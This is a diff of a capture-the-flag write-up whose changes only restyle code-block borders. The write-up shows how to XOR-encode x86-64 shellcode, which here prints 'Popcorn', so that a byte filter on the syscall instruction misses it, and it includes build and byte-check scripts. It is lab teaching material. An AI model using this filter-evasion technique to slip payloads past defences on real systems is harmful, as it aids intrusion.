@@ -30,7 +30,7 @@ encode a part of the shellcode to obfuscate the `0x0f05` bytes.
 I already had a basic shellcode from the level 1 to start with:
 
 
-+--------------------------------~<]  NASM  [>~--------------------------------+
+---------------------------------~<]  NASM  [>~---------------------------------
 section .text
     global _start
 
@@ -48,14 +48,14 @@ _start:
     mov rsi, rsp
     mov dl, 13
     syscall
-+------------------------------------------------------------------------------+
+--------------------------------------------------------------------------------
 
 
 It writes a string to the stack and then calls the `write syscall`. For this 
 challenge, the first part could be modified to the following to print `Popcorn`:
 
 
-+--------------------------------~<]  NASM  [>~--------------------------------+
+---------------------------------~<]  NASM  [>~---------------------------------
 section .text
     global _start
 
@@ -71,7 +71,7 @@ _start:
     mov rsi, rsp
     mov dl, 7
     syscall
-+------------------------------------------------------------------------------+
+--------------------------------------------------------------------------------
 
 
 Then i searched the web for different basic shellcode obfuscation techniques and
@@ -92,7 +92,7 @@ I tought it would also be on the challenge so I just stuck with writing it to
 the stack which was shown as executable in the challenge instructions.
 
 
-+--------------------------------~<]  NASM  [>~--------------------------------+
+---------------------------------~<]  NASM  [>~---------------------------------
 section .text
 global _start
 
@@ -126,7 +126,7 @@ call_encoded_shellcode:
         db 0x00                         ; xored shellcode will be put here
 
     shellcode_len equ $ - encoded_shellcode
-+------------------------------------------------------------------------------+
+--------------------------------------------------------------------------------
 
 
 Now, the asm code that prints Popcorn can be XORed with `0xaa` and added to the 
@@ -136,7 +136,7 @@ I used this toolchain to build assembly code and convert it to shellcode:
 
 
 > build-shellcode.sh
-+--------------------------------~<]  Bash  [>~--------------------------------+
+---------------------------------~<]  Bash  [>~---------------------------------
 #!/bin/bash
 
 if [ -z "$1" ]; then
@@ -164,11 +164,11 @@ if [ "$run_flag" == true ]; then
   echo "Executing"
   ./"${filename_noext}.linked"
 fi
-+------------------------------------------------------------------------------+
+--------------------------------------------------------------------------------
 
 
 > parse-shellcode.py
-+-------------------------------~<]  Python  [>~-------------------------------+
+--------------------------------~<]  Python  [>~--------------------------------
 #!/usr/bin/python3
 
 import sys
@@ -188,7 +188,7 @@ print(','.join(['0x' + r'{:02x}'.format(c) for c in shellcode]) + '\n')
 for c in shellcode:
     if c in [0x00, 0x05, 0x0f]:
         print(r"{:02x} byte found".format(c))
-+------------------------------------------------------------------------------+
+--------------------------------------------------------------------------------
 
 
 Then, compiling and printing the shellcode for the Popcorn asm gives us a 
@@ -210,14 +210,14 @@ output still doesn't contain any prohibited bytes with a quick `ctrl+f`.
 The output can then added to the previous asm code
 
 
-+--------------------------------~<]  NASM  [>~--------------------------------+
+---------------------------------~<]  NASM  [>~---------------------------------
 call_encoded_shellcode:
     call shellcode 
     encoded_shellcode:
         db 0xe2,0x9b,0x6a,0xe2,0x12,0xfa,0xc5,0xda,0xc9,0xc5,0xd8
         db 0xc4,0x8a,0xfa,0xe2,0x9b,0x55,0xe2,0x9b,0x6a,0x1a,0xab
         db 0xea,0x1d,0xab,0xe2,0x23,0x4c,0x18,0xad,0xa5,0xaf
-+------------------------------------------------------------------------------+
+--------------------------------------------------------------------------------
 
 
 The asm can finally be compiled to produce the final shellcode.
